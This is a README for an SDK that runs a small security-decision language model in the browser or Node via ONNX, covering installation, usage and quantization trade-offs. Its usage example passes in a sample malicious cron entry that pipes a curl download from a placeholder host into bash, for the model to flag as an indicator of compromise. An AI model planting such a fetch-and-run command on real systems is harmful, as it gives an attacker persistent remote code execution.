# ct0-edge

On-device SDK (browser, Node, edge) for **CT0 / alias3-micro-1026** running as ONNX over
[onnxruntime-web](https://onnxruntime.ai/) (WebGPU / WASM). One model, both modes:

- **System 1 — `decide()`**: a yes/no security decision in a single forward (reads logits, no tokens generated).
- **System 2 — `generate()` / `Chat`**: autoregressive generation (streaming).
- **Gate**: escalate from System 1 to System 2 when confidence is below a threshold.

By default it drives the **decode-only recurrent graph** `onnx/model_q4f16_decode.onnx` (~2.73 GB) — the
one that fits the browser's ~4 GB WASM cap and decodes at O(1)/token. **Requires `onnxruntime-web` ≥ 1.30**
(earlier versions miscompute quantized ops on WebGPU). No transformers.js PR needed.

Weights: **[eduardoworrel/ct0-alias3-micro-onnx](https://huggingface.co/eduardoworrel/ct0-alias3-micro-onnx)**
(ONNX export of [aliasrobotics/alias3-micro-1026](https://huggingface.co/aliasrobotics/alias3-micro-1026) — all model credit to Alias Robotics).

## Install

```bash
npm i ct0-edge @huggingface/transformers "onnxruntime-web@^1.30"
```

## Use

```js
import { CT0 } from "ct0-edge";

const ct0 = await CT0.load({ repo: "eduardoworrel/ct0-alias3-micro-onnx", onStatus: console.log });

// System 1 — decision (one forward, reads logits)
const p = await ct0.decide("path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
                           "Is this a suspicious indicator of compromise?");
console.log("P(yes) =", p);

// Gate + System 2
if (Math.abs(2 * p - 1) < 0.6) {
  for await (const piece of ct0.generate("Explain the reasoning.")) process.stdout.write(piece);
}
```

## Which graph (measured in Chrome / WebGPU)

A 4B model must fit under the browser's ~4 GB WASM cap. CT0's 248k-token vocab makes the embedding
huge, so it's quantized to **int4 (GatherBlockQuantized)**:

| graph (HF) | interface | size | fidelity¹ | browser speed | context |
|---|---|---|---|---|---|
| **`model_q4f16_decode`** (default) | custom (this lib) | **2.73 GB** | 9/16 | **~10 tok/s** | unbounded (O(1)) |
| **`model_q4f16`** | standard `generate()` / transformers.js | 2.99 GB | 9/16 | ~1.3 tok/s | unbounded (`Scan`) |
| `model_q4` / `model_fp16` | standard | 4.78 / 8.4 GB | 14–16/16 | — (Node only) | unbounded |

`model_q4f16` is the standard transformers.js file (`dtype:"q4f16"`); `model_q4f16_decode` is the same int4
weights in a custom decode-only graph this lib drives directly.

¹ greedy match vs fp32 over 16 tokens. **Trade-off:** fitting <4 GB needs the int4 embedding, which
costs fidelity (9/16); the 14–16/16 variants keep the embedding wide and don't fit the browser.

**Recipe:** `GatherBlockQuantized` embedding + `MatMulNBits` matmuls (`onnxruntime.quantization`),
on top of the optimum-onnx `qwen3_5` export. The default transformers.js q4 flow doesn't quantize the
embedding `Gather`, which is why large-vocab models otherwise overflow the browser.

## Related

- ONNX export (optimum): https://github.com/huggingface/optimum-onnx/pull/152
- transformers.js support: https://github.com/huggingface/transformers.js/pull/1803

## License

MIT (this SDK). The **model** weights follow the license of the
[base model](https://huggingface.co/aliasrobotics/alias3-micro-1026).
